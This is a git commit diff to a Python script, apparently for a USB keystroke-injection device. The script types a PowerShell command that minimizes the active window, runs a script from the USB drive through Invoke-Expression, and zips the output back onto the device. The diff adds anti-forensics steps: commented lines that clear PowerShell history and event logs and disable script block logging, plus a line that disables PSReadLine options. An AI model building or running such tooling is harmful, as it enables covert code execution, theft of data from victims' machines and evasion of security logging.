7c7e06b7a357dfdaa087bb2b8ee018b89b545e70
Network Sec <85315993+Network-Sec@users.noreply.github.com>
2024-11-30 01:22:00 +0100

    Update code.py

--- code.py
+++ code.py
@@ -176,19 +176,24 @@ def demos():
 
 
 def main():  
+    # #Clear-History; Remove-Item -Force -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; Clear-EventLog -LogName "Windows PowerShell";
+    # Add history clearing as required
+    # Make sure Invoke-Expression running the script is the last line
     command = """
-$o="C:/windows/temp/sout.txt";
+# Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force; 
+try { $env:PSReadLineOptions = $null; } catch { Write-Output "Disable failed" }
+$p="C:/windows/temp"
+$o="$p/sout.txt";
 $dl = ((Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":") -replace "^:$", "F:"
+if (-not (Test-Path $o)) { Expand-Archive -Path "$dl/sd/rg.zip" -DestinationPath "$p" -Force; 
 if (Test-Path $o) { del $o };
 Start-Job -ScriptBlock { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; using System.Threading; public class W { [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); public static void D(int d) { Thread.Sleep(d); ShowWindow(GetForegroundWindow(), 6); } }'; [W]::D(5000); }
 $v = (Get-Content "$dl/sd/demo.ps1") -join "`n";
-Invoke-Expression $v | Out-File -FilePath $o -Force;
-while (-not (Test-Path $o)) { Start-Sleep -Milliseconds 500 };
-Compress-Archive -Path $o -DestinationPath "$dl/sd/$(Split-Path -Leaf $o).zip";
-exit;
+Invoke-Expression $v | Out-File -FilePath $o -Force; while (-not (Test-Path $o)) { Start-Sleep -Milliseconds 500 }; Compress-Archive -Path $o -DestinationPath "$dl/sd/$(Split-Path -Leaf $o)_$(Get-Random).zip"; exit;
 """
-    time.sleep(7)
+    time.sleep(7) 
     run_ps(kbd, layout, command)
 
 main() 
+
 
